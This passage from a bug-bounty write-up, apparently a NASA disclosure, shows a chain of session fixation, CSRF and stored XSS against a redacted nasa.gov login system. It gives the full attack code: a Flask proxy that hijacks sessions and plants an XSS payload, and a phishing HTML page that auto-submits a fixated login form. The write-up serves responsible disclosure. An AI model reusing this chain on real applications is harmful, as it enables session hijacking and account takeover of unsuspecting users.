user&rsquo;s details (e.g. <em>username</em>), which were essential to successfully perform a Stored Cross-Site Scripting (XSS) attack. Once the <em>username</em> was obtained, the Stored XSS request was executed, ensuring that it would be triggered automatically upon the victim‚Äôs next login to the web application.</p><ol><li><p><strong>Login Initiator</strong>: Execute the Login Initiator request and return the generated <em>sessionid</em> (<em>loginid</em>) to the victim.</p></li><li><p><strong>Login Monitor</strong>: Perform Login Monitor to capture the authenticated user&rsquo;s information (e.g., <em>username</em>) required for the XSS malicious request.</p></li><li><p><strong>Store XSS</strong>: Inject a stored XSS payload into the victim&rsquo;s web application configuration using the collected <em>sessionid</em> (<em>loginid</em>) and <em>username</em>.</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>redirect</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask_cors</span> <span class=kn>import</span> <span class=n>CORS</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>xml.etree</span> <span class=kn>import</span> <span class=n>ElementTree</span> <span class=k>as</span> <span class=n>ET</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>threading</span> <span class=kn>import</span> <span class=n>Thread</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>CORS</span><span class=p>(</span><span class=n>app</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1. Login Initiator</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/proxy&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>proxy_request</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>url</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=s1>&#39;URL parameter is required&#39;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>root</span> <span class=o>=</span> <span class=n>ET</span><span class=o>.</span><span class=n>fromstring</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>loginid</span> <span class=o>=</span> <span class=n>root</span><span class=o>.</span><span class=n>findtext</span><span class=p>(</span><span class=s1>&#39;loginid&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Login ID: </span><span class=si>{</span><span class=n>loginid</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>loginMonitor</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>loginid</span><span class=p>,))</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>items</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)}),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. Login Monitor</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>loginMonitor</span><span class=p>(</span><span class=n>loginid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;host&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;REDACTED&gt;&gt;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=n>loginid</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;timeout&#39;</span><span class=p>:</span> <span class=mi>30</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Login Monitor ID: &#34;</span> <span class=o>+</span> <span class=n>loginid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/LoginMonitor&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=n>root</span> <span class=o>=</span> <span class=n>ET</span><span class=o>.</span><span class=n>fromstring</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>status</span> <span class=o>=</span> <span class=n>root</span><span class=o>.</span><span class=n>findtext</span><span class=p>(</span><span class=s1>&#39;status&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>status</span> <span class=o>!=</span> <span class=s2>&#34;valid&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/LoginMonitor&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=n>root</span> <span class=o>=</span> <span class=n>ET</span><span class=o>.</span><span class=n>fromstring</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>status</span> <span class=o>=</span> <span class=n>root</span><span class=o>.</span><span class=n>findtext</span><span class=p>(</span><span class=s1>&#39;status&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>status</span> <span class=o>==</span> <span class=s2>&#34;valid&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>root</span> <span class=o>=</span> <span class=n>ET</span><span class=o>.</span><span class=n>fromstring</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>uname</span> <span class=o>=</span> <span class=n>root</span><span class=o>.</span><span class=n>findtext</span><span class=p>(</span><span class=s1>&#39;uname&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>email</span> <span class=o>=</span> <span class=n>root</span><span class=o>.</span><span class=n>findtext</span><span class=p>(</span><span class=s1>&#39;email&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>uname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>uname</span> <span class=o>=</span> <span class=n>uname</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;_login_.&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Username:  </span><span class=si>{</span><span class=n>uname</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Email: </span><span class=si>{</span><span class=n>email</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Session Hijacked correctly!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>storeXSS</span><span class=p>(</span><span class=n>uname</span><span class=p>,</span> <span class=n>loginid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)}),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. Store XSS</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>storeXSS</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>loginid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/QueryServlet&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;setUserMetadata&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;user&#39;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;sessionid&#39;</span><span class=p>:</span> <span class=n>loginid</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;config&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;img src=x onerror=alert(&#34;PoC_XSS&#34;)&gt;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;relation&#39;</span><span class=p>:</span> <span class=s1>&#39;content&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;value&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;REDACTED&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Stored XSS response status code: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Stored XSS response content: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;XSS PoC stored successfully&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;At the first login at https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/ web application, the victim will automatically trigger the XSS payload!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>500</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Error storing XSS PoC&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;The server may be overloaded with a high volume of requests. Retry later!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;error&#39;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)}),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>8080</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=2-create-a-poc-html-file>2. Create a PoC HTML file<a hidden class=anchor aria-hidden=true href=#2-create-a-poc-html-file>#</a></h3><p>This chain will only be effective in a phishing attack scenario. A PoC HTML file was created to combine <em>Session Fixation</em> with <em>CSRF (Cross-Site Request Forgery)</em>.</p><ol><li><p><strong>Login Initiator</strong>: When the victim opens the PoC HTML file, a JavaScript payload is executed which triggers a fetch request to the attacker-controlled proxy server. The proxy then issues an HTTP POST request to the Login Initiator endpoint (<code>https://&lt;REDACTED>.nasa.gov/&lt;REDACTED>/LoginInitiator</code>) to obtain a new <em>sessionid</em>, which will later be associated with the victim&rsquo;s session.</p></li><li><p><strong>Login Form</strong>: Due to the way the login flow is implemented, the login form is dynamically generated through an HTTP POST request to <code>https://&lt;REDACTED>.nasa.gov/&lt;REDACTED>/LoginForm</code>. This request includes the previously obtained <em>sessionid</em> and <em>host</em> in the body, which are then embedded as hidden input fields in the returned form. As a result, when the victim submits their credentials, the same <em>sessionid</em> becomes associated with their authenticated session.</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Session Fixation + Stored XSS<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=c1>// 1. Login Initiator
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>window</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>url</span> <span class=o>=</span> <span class=s1>&#39;https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/LoginInitiator&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>proxy</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:8080/&#34;</span><span class=p>;</span> <span class=c1>// Python Proxy server URL
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>            <span class=nx>proxy_request</span> <span class=o>=</span> <span class=nx>proxy</span> <span class=o>+</span> <span class=s2>&#34;proxy?url=&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=nx>proxy_request</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>method</span><span class=o>:</span> <span class=s1>&#39;GET&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=nx>headers</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=s1>&#39;Content-Type&#39;</span><span class=o>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>response</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>status</span> <span class=o>===</span> <span class=mi>200</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=nx>response</span><span class=p>.</span><span class=nx>text</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Network response was not ok&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=nx>then</span><span class=p>(</span><span class=nx>responseText</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// Parse the XML response to get loginid (sessionid) and host
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=kr>const</span> <span class=nx>parser</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DOMParser</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>xmlDoc</span> <span class=o>=</span> <span class=nx>parser</span><span class=p>.</span><span class=nx>parseFromString</span><span class=p>(</span><span class=nx>responseText</span><span class=p>,</span> <span class=s2>&#34;application/xml&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>loginid</span> <span class=o>=</span> <span class=nx>xmlDoc</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s1>&#39;loginid&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>textContent</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>host</span> <span class=o>=</span> <span class=nx>xmlDoc</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s1>&#39;host&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>textContent</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// Display loginid and host for debugging
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Login ID:&#39;</span><span class=p>,</span> <span class=nx>loginid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Host:&#39;</span><span class=p>,</span> <span class=nx>host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nx>loginForm</span><span class=p>(</span><span class=nx>loginid</span><span class=p>,</span> <span class=nx>host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=k>catch</span><span class=p>(</span><span class=nx>error</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// Handle any errors
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Error:&#39;</span><span class=p>,</span> <span class=nx>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// 2. Login Form request
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>function</span> <span class=nx>loginForm</span><span class=p>(</span><span class=nx>loginid</span><span class=p>,</span> <span class=nx>host</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>url</span> <span class=o>=</span> <span class=s1>&#39;https://&lt;REDACTED&gt;.nasa.gov/&lt;REDACTED&gt;/LoginForm&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// Form data for the form request
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kr>const</span> <span class=nx>data</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>FormData</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>data</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s1>&#39;loginid&#39;</span><span class=p>,</span> <span class=nx>loginid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>data</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s1>&#39;host&#39;</span><span class=p>,</span> <span class=nx>host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>data</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s1>&#39;sessionid&#39;</span><span class=p>,</span> <span class=nx>loginid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// Send the second POST request
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kr>const</span> <span class=nx>form</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;form&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>form</span><span class=p>.</span><span class=nx>method</span> <span class=o>=</span> <span class=s1>&#39;POST&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>form</span><span class=p>.</span><span class=nx>action</span> <span class=o>=</span> <span class=nx>url</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// Append the form data to the form
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>for</span> <span class=p>(</span><span class=kr>const</span> <span class=p>[</span><span class=nx>key</span><span class=p>,</span> <span class=nx>value</span><span class=p>]</span> <span class=k>of</span> <span class=nx>data</span><span class=p>.</span><span class=nx>entries</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>input</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>input</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;hidden&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>input</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=nx>key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>input</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// Append the form to the body and submit it
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>form</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>form</span><span class=p>.</span><span class=nx>submit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=3-poc>3. PoC<a hidden class=anchor aria-hidden=true href=#3-poc>#</a></h3><p>Now that both the exploit and the proxy server were ready, I simulated a phishing attack by delivering the PoC HTML file to the victim (for simplicity, I used my own user <em>giacolenzo2109</em>).</p><p>The image below shows the output of the Python proxy server, highlighting each step of the attack flow that was successfully executed.</p><p>It is possible to observe how the server successfully obtained the <em>sessionid</em> used by the victim to login, and how the XSS was ultimately stored on the victim&rsquo;s account.</p><p><img alt="PoC Server" loading=lazy src=/images/articles/nasa-vdp/PoC_Server.png></p><h3 id=4-xss>4. XSS<a hidden class=anchor aria-hidden=true href=#4-xss>#</a></h3><p>Finally, the stored XSS payload was successfully triggered upon the victim‚Äôs first login.</p><p><img alt=GG loading=lazy src=/images/articles/nasa-vdp/GG.png></p><h1 id=reward>Reward<a hidden class=anchor aria-hidden=true href=#reward>#</a></h1><p>From a <em>P5 Stored XSS (Charmander)</em> to a <em>P2 Session Fixation</em> chained with <em>Self-Stored XSS</em>, significantly increasing the impact (<em>Charizard</em>).</p><p><img alt=P2 loading=lazy src=/images/articles/nasa-vdp/P2.png></p><h3 id=lesson-learned>Lesson Learned<a hidden class=anchor aria-hidden=true href=#lesson-learned>#</a></h3><p>Security weaknesses should always be viewed as part of a broader attack surface. By chaining vulnerabilities together, we can better assess their full risk and potential impact.</p><table><thead><tr><th>Vulnerability</th><th>Impact</th></tr></thead><tbody><tr><td>Self-Stored XSS <em>(Charmander)</em></td><td><span style=color:green><strong>P5</strong></span></td></tr><tr><td>Session Fixation <em>(Charmeleon)</em></td><td><span 